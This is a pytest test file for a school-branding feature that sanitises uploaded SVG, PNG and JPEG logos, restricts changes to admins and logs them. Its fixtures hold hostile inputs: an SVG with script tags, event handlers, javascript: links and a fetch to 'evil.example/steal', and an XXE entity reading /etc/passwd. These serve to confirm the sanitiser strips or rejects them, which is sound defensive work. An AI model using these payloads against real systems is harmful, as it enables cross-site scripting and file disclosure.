"""School name + logo setting: review_api/branding.py.

* SVG uploads are rendered to PNG on the server; a <script> never survives.
* PNG / JPEG are re-encoded without metadata; the stored type comes from the bytes.
* Admins can change the name and logo; teachers (and RBTs) can't. Every change is in the
  Activity Log as settings_changed with the field, never the file or the new text.
* Reset demo state puts the default name and badge back.
"""
from __future__ import annotations

import io
import json

import pytest
from PIL import Image

from test_hosted_auth import ADMIN, TEACHER_EMAIL, call, token  # noqa: F401
from test_hosted_auth import authn, hosted, store  # noqa: F401  (pytest fixtures)
from review_api import branding as b
from review_api.journal import MemoryJournal, Recorder
from review_api.notes import ApiError

EVIL_SVG = b"""<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="120" height="60" viewBox="0 0 120 60" onload="alert('onload')">
  <script type="text/javascript">alert('xss'); fetch('https://evil.example/steal')</script>
  <foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml">
    <script>alert(2)</script></body></foreignObject>
  <a xlink:href="javascript:alert(3)"><rect width="120" height="60" fill="#0f6e56"/></a>
  <image xlink:href="file:///etc/passwd" width="10" height="10"/>
  <circle cx="60" cy="30" r="20" fill="#ffffff" onclick="alert(4)"/>
</svg>"""


def png_bytes(size=(40, 20), color=(200, 30, 30, 255), **info):
    im = Image.new("RGBA", size, color)
    out = io.BytesIO()
    from PIL import PngImagePlugin
    meta = PngImagePlugin.PngInfo()
    for k, v in info.items():
        meta.add_text(k, v)
    im.save(out, format="PNG", pnginfo=meta)
    return out.getvalue()


def jpeg_with_exif():
    im = Image.new("RGB", (64, 32), (10, 120, 200))
    exif = Image.Exif()
    exif[0x010F] = "SecretCam"          # Make
    exif[0x9286] = "GPS home address"   # UserComment
    out = io.BytesIO()
    im.save(out, format="JPEG", exif=exif.tobytes())
    return out.getvalue()


# ---------------------------------------------------------------- cleaning

def test_svg_with_script_becomes_png_without_script():
    out = b.sanitize_logo(EVIL_SVG)
    assert out["content_type"] == "image/png" and out["source_format"] == "svg"
    data = out["bytes"]
    assert data.startswith(b"\x89PNG\r\n\x1a\n")
    for needle in (b"<script", b"script", b"alert", b"<svg", b"javascript", b"onload", b"evil.example"):
        assert needle not in data.lower()
    im = Image.open(io.BytesIO(data))
    assert im.format == "PNG" and max(im.size) == b.MAX_SIDE and im.size == (512, 256)
    assert im.getpixel((5, 5))[:3] == (15, 110, 86)          # the rectangle was drawn


def test_clean_svg_drops_active_and_external_parts():
    svg = b.clean_svg(EVIL_SVG.decode())
    low = svg.lower()
    for gone in ("<script", "foreignobject", "onload", "onclick", "javascript:", "file:///"):
        assert gone not in low


@pytest.mark.parametrize("svg", [
    b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
    b'<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>',
    b'<svg xmlns="http://www.w3.org/2000/svg"><rect',                      # not well-formed
    b'<html><svg xmlns="http://www.w3.org/2000/svg"/></html>',              # svg not the root
    b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1000"/>',      # absurd aspect
])
def test_bad_svgs_refused(svg):
    with pytest.raises(ApiError) as e:
        b.sanitize_logo(svg)
    assert e.value.http == 422


def test_png_reencoded_without_metadata():
    out = b.sanitize_logo(png_bytes(Author="Teacher Name", Comment="secret"))
    assert out["content_type"] == "image/png"
    assert b"Teacher Name" not in out["bytes"] and b"tEXt" not in out["bytes"]
    assert Image.open(io.BytesIO(out["bytes"])).size == (40, 20)


def test_jpeg_reencoded_without_exif():
    src = jpeg_with_exif()
    assert b"SecretCam" in src
    out = b.sanitize_logo(src)
    assert out["content_type"] == "image/jpeg"
    assert b"SecretCam" not in out["bytes"] and b"Exif" not in out["bytes"]
    assert not Image.open(io.BytesIO(out["bytes"])).getexif()


def test_type_comes_from_the_bytes_and_size_is_capped():
    with pytest.raises(ApiError) as e:
        b.sanitize_logo(b"GIF89a....")
    assert (e.value.http, e.value.code) == (422, "LOGO_TYPE")
    with pytest.raises(ApiError) as e:
        b.sanitize_logo(b"<html><script>alert(1)</script></html>")
    assert e.value.code == "LOGO_TYPE"
    with pytest.raises(ApiError) as e:
        b.sanitize_logo(b"\x89PNG\r\n\x1a\n" + b"0" * (b.MAX_UPLOAD + 1))
    assert (e.value.http, e.value.code) == (413, "LOGO_TOO_LARGE")
    with pytest.raises(ApiError) as e:
        b.sanitize_logo(b"\x89PNG\r\n\x1a\nnot really a png")
    assert e.value.code == "IMAGE_INVALID"


def test_name_cleaning():
    assert b.clean_name("  Big \n School\t\u200b Name ") == "Big School Name"
    for bad in ("", "   ", "x" * (b.MAX_NAME + 1), None, 5):
        with pytest.raises(ApiError):
            b.clean_name(bad)


# ---------------------------------------------------------------- who may change it

def _who(authn, email):
    from test_hosted_auth import hdr
    return authn.require(hdr(token(email, uid="uid" + email.split("@")[0].replace(".", ""))))


def test_teacher_cannot_change_admin_can(store, authn):
    journal = MemoryJournal()
    br = b.Branding(store, Recorder(journal))
    teacher, admin = _who(authn, TEACHER_EMAIL), _who(authn, ADMIN)
    assert br.view()["school_name"] == "Everyday Heroes Academy" and br.view()["is_default"]
    assert br.view()["logo"]["builtin"] and br.view()["badge_text"] == "EH"
    for act in (lambda: br.set_name(teacher, "Teacher School"), lambda: br.set_logo(teacher, png_bytes()),
                lambda: br.remove_logo(teacher), lambda: br.reset(teacher),
                lambda: br.set_name("usr_demo_sarah", "Laptop School")):
        with pytest.raises(ApiError) as e:
            act()
        assert (e.value.http, e.value.code) == (403, "ADMIN_ONLY")
    assert store.list(b.PREFIX) == [] and not journal._rows

    v = br.set_name(admin, "Peachtree Learning Academy")
    assert v["school_name"] == "Peachtree Learning Academy" and not v["is_default"]
    v = br.set_logo(admin, EVIL_SVG)
    assert v["logo"]["content_type"] == "image/png"
    data, ctype = br.logo()
    assert ctype == "image/png" and b"script" not in data
    stored = json.dumps([store.read_json(n) for n in store.list(b.PREFIX)])
    assert "script" not in stored and "<svg" not in stored         # the SVG itself is never kept
    assert len(store.list(b.PREFIX)) == 2                          # one create-only record per change

    rows = journal._rows
    assert [(r["action"], r["record_id"], r["details"]) for r in rows] == [
        ("settings_changed", "school_branding", {"setting": "school_name"}),
        ("settings_changed", "school_branding", {"setting": "school_logo", "image_format": "svg"})]
    assert "Peachtree" not in json.dumps(rows)                    # field changed, not the new text

    v = br.reset(admin)
    assert v["is_default"] and v["school_name"] == "Everyday Heroes Academy" and v["logo"]["builtin"]
    data, ctype = br.logo()                                        # back to the built-in badge
    assert ctype == "image/png" and data == b.builtin_logo()
    assert journal._rows[-1]["details"] == {"setting": "reset"}
    n = len(store.list(b.PREFIX))
    br.reset(admin)                                                # already default: nothing new written
    assert len(store.list(b.PREFIX)) == n


def test_never_overwrites(store, authn, monkeypatch):
    """review-web may only create under branding/ (no overwrite / delete): every save is a new object."""
    br = b.Branding(store, Recorder(MemoryJournal()))
    admin = _who(authn, ADMIN)
    writes = []
    real = store.write_json
    monkeypatch.setattr(store, "write_json", lambda name, data, **kw: (writes.append((name, kw)), real(name, data, **kw)))
    br.set_name(admin, "One")
    br.set_name(admin, "Two")
    assert all(n.startswith("branding/") and kw.get("create_only") for n, kw in writes) and len({n for n, _ in writes}) == 2
    assert br.view()["school_name"] == "Two"


# ---------------------------------------------------------------- over HTTP

def test_http_branding(hosted):
    t_tok, a_tok = token(TEACHER_EMAIL, uid="uidteacher"), token(ADMIN)
    st, body, _ = call(hosted, "/api/branding", tok=t_tok)
    assert st == 200 and json.loads(body)["school_name"] == "Everyday Heroes Academy"
    assert call(hosted, "/api/branding")[0] == 401                  # signed in only

    st, body, _ = call(hosted, "/api/admin/branding", tok=t_tok, method="POST", body={"school_name": "X"})
    assert (st, json.loads(body)["error"]) == (403, "ADMIN_ONLY")
    import urllib.request

    def upload(tok, data, ctype):
        req = urllib.request.Request(hosted + "/api/admin/branding/logo", data=data, method="POST",
                                     headers={"Authorization": f"Bearer {tok}", "Content-Type": ctype})
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()

    assert upload(t_tok, png_bytes(), "image/png")[0] == 403
    assert upload(a_tok, png_bytes(), "text/html")[0] == 415
    st, body = upload(a_tok, EVIL_SVG, "image/svg+xml")
    assert st == 200, body
    st, data, headers = call(hosted, "/api/branding/logo", tok=t_tok)
    assert st == 200 and headers["Content-Type"] == "image/png" and data.startswith(b"\x89PNG")
    assert headers["X-Content-Type-Options"] == "nosniff" and b"script" not in data

    st, body, _ = call(hosted, "/api/admin/branding", tok=a_tok, method="POST",
                       body={"school_name": "A Very Long School Name For Testing"})
    assert st == 200 and json.loads(body)["school_name"] == "A Very Long School Name For Testing"
    st, body, _ = call(hosted, "/api/admin/branding/reset", tok=a_tok, method="POST", body={})
    assert st == 200 and json.loads(body)["is_default"]
    st, data, _ = call(hosted, "/api/branding/logo", tok=t_tok)       # after reset: the built-in badge
    assert st == 200 and data == b.builtin_logo()
    assert call(hosted, "/api/branding/logo")[0] == 401                # the badge too: signed in only


# ---------------------------------------------------------------- school profiles (Oct 10)

def test_builtin_badge_is_a_clean_png():
    data = b.builtin_logo()
    im = Image.open(io.BytesIO(data))
    assert im.format == "PNG" and im.size == (256, 256) and not im.text      # no text/metadata chunks


def test_remove_logo_hides_the_builtin_badge_too(store, authn):
    br = b.Branding(store, Recorder(MemoryJournal()))
    admin = _who(authn, ADMIN)
    v = br.remove_logo(admin)
    assert v["logo"] is None and v["badge_text"] == "EH" and not v["is_default"]
    with pytest.raises(ApiError):
        br.logo()
    v = br.set_logo(admin, png_bytes())
    assert v["logo"] and not v["logo"].get("builtin")


def test_demo_school_profile_holds_records_with_no_profile(store, authn, monkeypatch):
    """Records from before Oct 10 (no profile) belong to Demo School, shown only with that profile."""
    store.write_json("branding/20261009T120000.000000Z-aaaaaaaa.json",
                     {"school_name": "North Campus", "updated_at": "2026-10-09T12:00:00+00:00"}, create_only=True)
    br = b.Branding(store, Recorder(MemoryJournal()))
    monkeypatch.delenv("SCHOOL_PROFILE", raising=False)
    v = br.view()
    assert v["school_name"] == "Everyday Heroes Academy" and v["profile"] == "everyday-heroes" and v["is_default"]
    br.set_name(_who(authn, ADMIN), "Heroes Demo")
    assert br.view()["school_name"] == "Heroes Demo"
    monkeypatch.setenv("SCHOOL_PROFILE", "demo-school")
    v = br.view()
    assert (v["school_name"], v["badge_text"], v["logo"], v["profile"]) == ("North Campus", "DS", None, "demo-school")
    assert v["defaults"] == {"school_name": "Demo School", "badge_text": "DS"}
    monkeypatch.setenv("SCHOOL_PROFILE", "no-such-school")
    assert br.view()["school_name"] == "Heroes Demo"                   # unknown profile: the demo school
